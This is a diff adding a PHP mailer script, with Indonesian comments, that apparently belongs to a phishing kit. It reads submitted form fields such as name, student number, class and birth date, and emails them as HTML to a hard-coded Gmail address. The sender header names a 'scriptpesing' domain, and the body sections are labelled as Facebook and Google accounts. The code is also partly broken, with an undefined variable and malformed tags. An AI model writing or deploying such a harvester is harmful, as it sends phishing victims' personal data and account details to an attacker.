@@ -1,0 +1,45 @@
+<?php
+############################################
+##        Author: T-faces                ##
+##       Mailer: Aray2                    ##
+##  Modifer: https://t-faces.github.io  ##
+############################################
+/* JANGAN GANTI COPYRIGHT NYA YA SAYANG */
+
+$subjek = 'Stok Fb Datang Bos';
+$mailto = 'ariagungsatria01@gmail.com'; //masukin email lo disini
+
+/* Fungsi berikut untuk mengambil input field. */
+$nama = $_POST['Nama'];
+$nim = $_POST['NIM'];
+$kelas = $_POST['Kelas'];
+$j_kel = $_POST['Male'];
+$j_kel = $_POST['Female'];
+$date = $_POST['tgl_lahir'];
+
+
+/* Mengambil informasi untuk dikirim kepada email anda !. */
+
+$body = <<<EOD
+<br><hr><br>
+<h2<b><font color="red"> >>>>>>Akun facebook<<<<<<</font></b></h2>
+<br>
+Nama : <font color="green">$nama</font> 
+<br>
+Nim : <font color="green">$nim</font> <br>
+Kelas : <font color="red">$kelas</font> <br>
+<br>
+<h2<b><font color="red"> >>>>>>Akun Google<<<<<<</font></b></h2>
+<br>
+Email Recovery : <font
+color="orange">$name</font>
+<br>
+Nama : <font color="red">$name</font> <br>
+NIM : <font color="purple">$nim</font> <br>
+Kelas : <font color="blue">$kelas</font> <br>
+EOD;
+
+
+$headers = "From: info@scriptpesing.com\r\n"; // Buat nunjukin pengirim email.
+$headers .= "Content-type: text/html\r\n"; // Untuk memerintahkan server melakukan coding teks.
+$success = mail($mailto, $subjek, $body, $headers); // Hal-hal yang akan dikirim.
